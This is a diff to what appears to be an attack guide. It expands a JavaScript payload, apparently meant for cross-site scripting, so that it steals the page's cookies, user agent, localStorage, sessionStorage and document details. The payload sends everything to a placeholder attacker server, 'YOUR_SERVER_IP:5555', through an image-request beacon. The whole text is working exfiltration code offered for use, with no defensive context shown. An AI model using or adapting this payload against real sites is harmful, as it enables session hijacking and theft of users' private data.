@@ -80,6 +80,12 @@ sudo python3 -m http.server 4444
     <script>
       (async function() {
         try {
+          // Collect User-Agent
+          let userAgent = navigator.userAgent;
+
+          // Collect Cookies
+          let cookies = document.cookie;
+
           // Collect Local Storage Data
           let localStorageData = {};
           for (let i = 0; i < localStorage.length; i++) {
@@ -94,15 +100,26 @@ sudo python3 -m http.server 4444
             sessionStorageData[key] = sessionStorage.getItem(key);
           }
 
-          // Create an object to hold all storage data
+          // Collect Document Properties
+          let documentData = {
+            title: document.title,
+            url: document.URL,
+            referrer: document.referrer,
+            domain: document.domain
+          };
+
+          // Create a final object to hold all the data
           let data = {
+            userAgent: userAgent,
+            cookies: cookies,
             localStorage: localStorageData,
-            sessionStorage: sessionStorageData
+            sessionStorage: sessionStorageData,
+            document: documentData
           };
 
           // Send the data to your server
           let img = new Image();
-          img.src = 'http://YOUR_SERVER_IP:5555/?storage=' + encodeURIComponent(JSON.stringify(data));
+          img.src = 'http://YOUR_SERVER_IP:5555/?allData=' + encodeURIComponent(JSON.stringify(data));
         } catch (error) {
           let img = new Image();
           img.src = 'http://YOUR_SERVER_IP:5555/?error=' + encodeURIComponent(error);
